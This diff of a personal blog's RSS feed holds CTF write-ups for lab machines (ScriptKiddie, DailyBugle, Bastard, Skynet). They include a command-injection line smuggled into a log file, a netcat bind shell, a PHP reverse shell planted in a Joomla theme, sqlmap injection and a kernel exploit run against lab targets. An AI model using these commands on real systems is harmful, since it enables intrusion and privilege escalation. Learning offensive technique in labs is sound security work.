+<p>We then upload the payload as an Android template and before submitting it, let&rsquo;s not forget to start ar listener like so : <code>nc -nlvp 9001</code> (or your usual port). Let&rsquo;s, now, submit the request, and you should get a shell back as use kid. From here, I like to generate an ssh key and add it to the <code>.ssh/authorized_keys</code> for easier access.</p>
+<p>Once this is done, I have a proper shell and way to come back easily.</p>
+<p>Let&rsquo;s grab <code>user</code>&rsquo;s flag:</p>
+<p></p>
+<h3 id="pivoting">Pivoting</h3>
+<p>Now that we are kid user, we notice that there is also a pwn user that is running a script periodically. Even more interestingly, it uses a file owned by kid as input.</p>
+<p>The script in question is located at <code>/home/pwn/scanlosers.sh</code>  and looks like below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d&#39; &#39; -f3- | sort -u | while read ip; do
+    sh -c &#34;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&#34; &amp;
+done
+
+if [[ $(wc -l &lt; $log) -gt 0 ]]; then echo -n &gt; $log; fi
+</code></pre></td></tr></table>
+</div>
+</div><p>After a quick look at the script, we notice that it is reads the the file <code>/home/kid/logs/hackers</code>, search for the third field on the line, and run an <code>nmap</code> scan against this field.</p>
+<p>Now we can trick this script into running a custom command after the <code>nmap</code>&rsquo;s one.</p>
+<p>After a few trial and errors, I arrived to the following line of code :</p>
+<p><code>echo &quot;1 2 127.0.0.1';/home/kid/nc.sh;date&quot; &gt; /home/kid/logs/hackers</code></p>
+<p>with <code>nc.sh</code> being:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">#!/bin/bash
+
+/home/kid/nc -lvp 9001 -e /bin/bash
+</code></pre></td></tr></table>
+</div>
+</div><p>Don&rsquo;t forget to run a listener on port 9001, in order to grab the reverse shell. I would have wanted to do the &ldquo;ssh trick&rdquo; for easier access, but the <code>.ssh/authorized_keys</code> is owned by root&hellip; So I&rsquo;ll have to make it do with the temporary shell as <code>pwn</code>&rsquo;s user.</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Now that we are pwn, let&rsquo;s start by a simple <code>sudo -l</code> :</p>
+<p></p>
+<p>msfconsole can be run as root without password&hellip;. let&rsquo;s do it and cat the <code>root</code>&rsquo;s flag:</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>This was quite a fun box, with a few extra steps for an &ldquo;easy&rdquo; machine. It also shows that hackers can be hacked! ;)</p>
+]]></description></item><item><title>THM - DailyBugle without MetaSploit</title><link>https://www.masoopy.com/thm-dailybugle-without-metasploit/</link><pubDate>Wed, 17 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-dailybugle-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/03/DailyBugle_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro This box looks promising, featuring a real life CMS, Joomla, and one that is quite often in the wild too! It is even a CMS I used several years ago, for one of my blog!
-Let&rsquo;s see right now, if we can get in!
-Target THM - DailyBugle
-Recon Quick recon according to logo and info :
- Linux ; Joomla CMS, SQLi ; Privesc via yum.  Enum Usual nmap scan :]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>This box looks promising, featuring a real life CMS, <a href="https://www.joomla.org/" target="_blank" rel="noopener noreferrer">Joomla</a>, and one that is quite often in the wild too! It is even a CMS I used several years ago, for one of my blog!</p>
+<p>Let&rsquo;s see right now, if we can get in!</p>
+<h2 id="target">Target</h2>
+<p><a href="https://tryhackme.com/room/dailybugle" target="_blank" rel="noopener noreferrer">THM - DailyBugle</a></p>
+<h2 id="recon">Recon</h2>
+<p>Quick recon according to logo and info :</p>
+<ul>
+<li>Linux ;</li>
+<li>Joomla CMS, SQLi ;</li>
+<li>Privesc via yum.</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<p>Usual <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -sC -sV -oA scans/$target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-17 13:45 CET
+Nmap scan report for $target_ip ($target_ip)
+Host is up (0.034s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey:
+|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
+|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
+|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
+80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+|_http-generator: Joomla! - Open Source Content Management
+| http-robots.txt: 15 disallowed entries
+| /joomla/administrator/ /administrator/ /bin/ /cache/
+| /cli/ /components/ /includes/ /installation/ /language/
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+|_http-title: Home
+3306/tcp open  mysql   MariaDB (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="exploitation">Exploitation</h2>
+<p>Manually browsing to the website confirms a Joomla website. Let&rsquo;s run <code>joomscan</code> in order to gather more info. We are especially interested about the version. Since we are looking for a known SQL injection.</p>
+<p>After a few seconds, it happens our target is running <code>Joomla 3.7.0</code> :</p>
+<p></p>
+<p>According to <a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener noreferrer">exploit-db</a>, which confirms the <code>SQLi</code>, we can now run <code>sqlmap</code> like shown below:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sqlmap -u &#34;http://$target_ip/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+</code></pre></td></tr></table>
+</div>
+</div><p>While having this info is cool, it looks tedious to get what I am looking for.</p>
+<p>Doing a little more research for an easy win, I came across a <a href="https://github.com/stefanlucas/Exploit-Joomla" target="_blank" rel="noopener noreferrer">Python script</a> to exploit this vuln, and it directly returned juicy info :</p>
+<p></p>
+<p>Looking on internet, this hash appears to be bcrypt, so let&rsquo;s try to crack it with hashcat:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">hashcat -m 3200 jonah.hash /usr/share/wordlists/rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>After a little while, it worked :</p>
+<p></p>
+<p>Doing a little more internet research, I found that there is another vuln in Joomla that allows an <a href="https://vk9-sec.com/reverse-shell-on-any-cms/" target="_blank" rel="noopener noreferrer">admin user to get reverse shell</a>&hellip;</p>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>According to the link above, I edited a php file from an existing theme, replacing it with a <code>PHP reverse shell</code> (the one from Kali / Parrot, located in <code>/usr/share/webshell</code>), saved it, and called the URL : <code>http://$target_ip/templates/beez3/index.php</code> where <code>beez3</code> is the theme&rsquo;s name and <code>index.php</code> the file I edited.</p>
+<p>It got me my foothold :</p>
+<p></p>
+<p>We are <code>www-data</code> user, (un)fortunately and need to privesc!</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>In order to do so, I downloaded and ran <code>linpeas.sh</code> on the target.</p>
+<p>After a little while, it discovered interesting information such as <code>jjameson</code> user, a password in Joomla&rsquo;s <code>configuration.php</code>, and other things&hellip; As always, I was looking for an easy win, and tried to connect via SSH with the credentials I found&hellip; and it worked!</p>
+<p>I was now, in as <code>jjameson</code> with a real shell, stable connection and easy way to come back in!</p>
+<p>First command I issued was <code>sudo -l</code> in order to see if I could do anything as <code>root</code>. It turns out, I was allowed to run <code>yum</code>, which was very promising.</p>
+<p>A quick look at <a href="https://gtfobins.github.io/gtfobins/yum/#sudo" target="_blank" rel="noopener noreferrer">GTFObins</a> confirmed another easy win was probably coming. I simply copied/pasted (but also analyzed it, to make sure I understood what it did; there is no learning if you blindly copy/paste) the bits of code, and got a <code>root shell</code> :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>I found this box quite &ldquo;straightforward&rdquo; and very fun : chaining multiple vulns, in order to get a shell, then user misconfiguration in order to pwn a specific user and finally become <code>root</code>!</p>
+<p>I am pretty sure, there are other ways to get <code>root</code> on this box (maybe with <code>kernel</code>, or <code>sudo</code> directly), but for once, I wanted to go the &ldquo;intended&rdquo; way.</p>
+]]></description></item><item><title>HTB - Bastard without MetaSploit</title><link>https://www.masoopy.com/htb-bastard-without-metasploit/</link><pubDate>Wed, 03 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/htb-bastard-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/03/Bastard_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro Let&rsquo;s up the game a little bit and attack a medium rated box for the very first time!
-Target HTB - Bastard
-Recon A quick look to the box info reveals :
- Windows box ; Misc : php, web, patch management.  I assume this will be about an outdated PHP application running under Windows.
-Enum We run our classic nmap scan :
-1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  Host discovery disabled (-Pn).]]></description></item><item><title>THM - Skynet without MetaSploit</title><link>https://www.masoopy.com/thm-skynet-without-metasploit/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/thm-skynet-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>Let&rsquo;s up the game a little bit and attack a medium rated box for the very first time!</p>
+<h2 id="target">Target</h2>
+<p><a href="URL" rel="">HTB - Bastard</a></p>
+<h2 id="recon">Recon</h2>
+<p>A quick look to the box info reveals :</p>
+<ul>
+<li>Windows box ;</li>
+<li>Misc : php, web, patch management.</li>
+</ul>
+<p>I assume this will be about an outdated PHP application running under Windows.</p>
+<h2 id="enum">Enum</h2>
+<p>We run our classic <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 12:23 CET
+Nmap scan report for bastard.htb (10.129.90.188)
+Host is up (0.024s latency).
+Not shown: 65532 filtered ports
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Microsoft IIS httpd 7.5
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods:
+|_  Potentially risky methods: TRACE
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Welcome to Bastard | Bastard
+135/tcp   open  msrpc   Microsoft Windows RPC
+49154/tcp open  msrpc   Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: phone|general purpose|specialized
+Running (JUST GUESSING): Microsoft Windows Phone|2008|7|8.1|Vista|2012 (92%)
+OS CPE: cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT      ADDRESS
+1   23.34 ms 10.10.14.1
+2   23.46 ms bastard.htb (10.129.90.188)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 157.23 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>We also run our team of usual&rsquo;s suspects tools, such as <code>nikto</code> and <code>gobuster</code> and manually <code>browsing</code> with <code>Burp</code> enabled.</p>
+<p>We&rsquo;ll notice a <code>Drupal 7.54</code> installation which is vulnerable to <a href="https://github.com/dreadlocked/Drupalgeddon2" target="_blank" rel="noopener noreferrer">Drupalgeddon 2</a> :</p>
+<p></p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>Manually exploiting the vuln with the ruby script found during our recon will give us an initial shell as <code>authority\iusr</code> :</p>
+<p></p>
+<p>It is now time for internal recon, before we try to escalate our privs!</p>
+<h3 id="privesc">PrivEsc</h3>
+<p>Since our shell is quite limited, we&rsquo;ll have to find several to get what we want. For example, running winpeas and similar tools won&rsquo;t work. It will time out before we can get the results, and I couldn&rsquo;t find a way to write the output to a logfile.</p>
+<p>After searching, I found <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener noreferrer">Windows Exploit Suggester</a>. It is a <code>python2 script</code> that works on my attacking machine from the output of the <code>systeminfo</code> command :</p>
+<p></p>
+<p>So going down the list I found one kernel exploit that seemed particularly interesting : <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059" target="_blank" rel="noopener noreferrer">MS10-059</a>.</p>
+<p>Once uploaded, just run it without argument and it&rsquo;ll tell you that it requires an IP and port, in order to pop a reverse shell.</p>
+<p>So I ran it like so :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">MS10-059.exe &#34;$attacking_ip&#34; &#34;1234&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p>Hopefully, it worked and gave me <code>SYSTEM</code> :</p>
+<p></p>
+<p>Harvest flag and call it a day :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>This has been my first even &ldquo;medium&rdquo; rated box and I am very happy I did it on my own. I found this initial shell pretty easy, but then got quite confused when I couldn&rsquo;t work with <code>winpeas</code> and other executables. This is when I started researching for other way to enum the box and found the <code>python exploit suggester</code>. From, here it was some googling and mor trial and error, but it worked!</p>
+]]></description></item><item><title>THM - Skynet without MetaSploit</title><link>https://www.masoopy.com/thm-skynet-without-metasploit/</link><pubDate>Mon, 01 Mar 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-skynet-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/Skynet_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro A new, mysterious box. It is Terminator themed, but I have no idea what it will reveal Let&rsquo;s dive in!
-Target THM - Skynet
-Recon Not much recon here. Contrary to our previous targets which were &ldquo;training boxes&rdquo;, this one is doesn&rsquo;t hold your hand. Let&rsquo;s directly enumerate it!
-Enum Usual nmap scan :
-1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  | smb-os-discovery: | OS: Windows 6.]]></description></item><item><title>THM - GameZone</title><link>https://www.masoopy.com/thm-gamezone/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/thm-gamezone/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>A new, mysterious box. It is Terminator themed, but I have no idea what it will reveal Let&rsquo;s dive in!</p>
+<h2 id="target">Target</h2>
+<p><a href="https://tryhackme.com/room/skynet" target="_blank" rel="noopener noreferrer">THM - Skynet</a></p>
+<h2 id="recon">Recon</h2>
+<p>Not much recon here. Contrary to our previous targets which were &ldquo;training boxes&rdquo;, this one is doesn&rsquo;t hold your hand. Let&rsquo;s directly enumerate it!</p>
+<h2 id="enum">Enum</h2>
+<p>Usual <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">| smb-os-discovery:
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2021-02-27T02:05:39-06:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2021-02-27T08:05:39
+|_  start_date: N/A
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   31.41 ms 10.11.0.1
+2   31.82 ms 10.10.223.240
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Feb 27 09:05:36 2021 -- 1 IP address (1 host up) scanned in 51.35 seconds
+</code></pre></td></tr></table>
+</div>
+</div><p>we find the following <code>Samba</code> shares :</p>
+<p></p>
+<p>Enumerating them further will reveal juicy info inside <code>anonymous</code> such as passwords' list and a message telling us that all employees are required to change their passwords.</p>
+<p><code>Nikto</code> and <code>gobuster</code> will reveal a <code>SquirrelMail version 1.4.23 [SVN]</code> installation :</p>
+<p></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now, using <code>Burp</code>, we&rsquo;ll try some <a href="https://en.wikipedia.org/wiki/Credential_stuffing" target="_blank" rel="noopener noreferrer">credentials stuffing</a> in order to login. From our first SMB recon, we discovered a plausible user : <code>milesdyson</code>, and a list of passwords.</p>
+<p>In the intruder&rsquo;s tab set up a <code>sniper</code> attack, using <code>milesdyson</code> as user and the password field as the only payload :</p>
+<p></p>
+<p>We, now, load the password list found during SMB enumeration :</p>
+<p></p>
+<p>And finally, we add a &ldquo;grep condition&rdquo; in order to filter our results :</p>
+<p></p>
+<p>After a little while, we find a working set of credentials:</p>
+<p></p>
+<p>and we are in Miles' mailbox !</p>
+<p>Now, reading Miles' email, we&rsquo;ll find a password for Samba :</p>
+<p></p>
+<p>We can now use it in order to connect to the Samba share, like so : <code>smbclient \\\\$target_ip\\milesdyson -U milesdyson</code></p>
+<p></p>
+<p>Exploring the share will reveal an odd file called <code>important.txt</code>. Inside this file, we learn the existence of new <code>CMS</code> located at : <code>http://$target_ip/45kra24zxs28v3yd/</code>.</p>
+<p>Further scanning reveals admin page :</p>
+<p></p>
+<p>Doing a quick search, we&rsquo;ll find the <code>Cuppa CMS</code> is vulnerable to <a href="https://www.exploit-db.com/exploits/25971" target="_blank" rel="noopener noreferrer">RFI/LFI</a>.</p>
+<h3 id="getting-initial-shell">Getting Initial Shell</h3>
+<p>We craft the URL to match our target, replacing <code>cuppa</code> by <code>administrator</code>, set up a <code>listener</code> and get initial shell :</p>
+<p></p>
+<p>We harvest <code>user's flag</code> in <code>milesdyson</code>&rsquo;s home folder :</p>
+<p></p>
+<h3 id="privesc">PrivEsc</h3>
+<p>We download our classic tools to the box and launch them. Unfortunately here, I didn&rsquo;t find anything obvious. I tried a few probable exploits, such as <code>dirtyc0w</code>, and a few others, but nothing worked.</p>
+<p>Finally, I paid closer attention to kernel version, and noticed that <code>4.8.0-58-generic</code> might be <a href="https://www.exploit-db.com/exploits/43418" target="_blank" rel="noopener noreferrer">vulnerable</a>.</p>
+<p>After a few quick steps of download, compile, &ldquo;send&rdquo; to target, I was ready to run it, and BOOM! it worked:</p>
+<p></p>
+<p>Finally, we collect <code>root's flag</code> :</p>
+<p></p>
+<h2 id="outro">Outro</h2>
+<p>Another box rooted, it seems that even the inventor of <a href="https://terminator.fandom.com/wiki/Neural_Net_CPU" target="_blank" rel="noopener noreferrer">neural-net processor</a> can&rsquo;t resist us! :)</p>
+]]></description></item><item><title>THM - GameZone</title><link>https://www.masoopy.com/thm-gamezone/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><dc:creator>Denis G.</dc:creator><guid>https://www.masoopy.com/thm-gamezone/</guid><description><![CDATA[<div class="featured-image">
                 <img src="/images/2021/02/GameZone_Logo.png" referrerpolicy="no-referrer">
-            </div>Intro Trying to get a change from HTB, today I&rsquo;ll write about a THM box! And this time, we&rsquo;ll also have a look at SQLi!
-Target THM - GameZone
-Recon Quick recon according to logo and info :
- Linux ; Misc: SSH, SQLi (which means a web server).  Enum Let&rsquo;s start a full nmap scan :
-1  sudo nmap -T4 -A -p- -oA scan $target_ip   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  Host discovery disabled (-Pn).]]></description></item><item><title>THM - HackPark without MetaSploit</title><link>https://www.masoopy.com/thm-hackpark-without-metasploit/</link><pubDate>Sun, 21 Feb 2021 00:00:00 +0000</pubDate><author>Author</author><guid>https://www.masoopy.com/thm-hackpark-without-metasploit/</guid><description><![CDATA[<div class="featured-image">
+            </div><h2 id="intro">Intro</h2>
+<p>Trying to get a change from <a href="https://www.masoopy.com/tags/htb/" target="_blank" rel="noopener noreferrer">HTB</a>, today I&rsquo;ll write about a <a href="https://www.masoopy.com/tags/thm/" target="_blank" rel="noopener noreferrer">THM</a> box! And this time, we&rsquo;ll also have a look at SQLi!</p>
+<h2 id="target">Target</h2>
+<p><a href="https://tryhackme.com/room/gamezone" target="_blank" rel="noopener noreferrer">THM - GameZone</a></p>
+<h2 id="recon">Recon</h2>
+<p>Quick recon according to logo and info :</p>
+<ul>
+<li>Linux ;</li>
+<li>Misc: SSH, SQLi (which means a web server).</li>
+</ul>
+<h2 id="enum">Enum</h2>
+<p>Let&rsquo;s start a full <code>nmap</code> scan :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">sudo nmap -T4 -A -p- -oA scan $target_ip
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 11:38 CET
+Nmap scan report for $target_ip
+Host is up (0.033s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
+|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
+|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
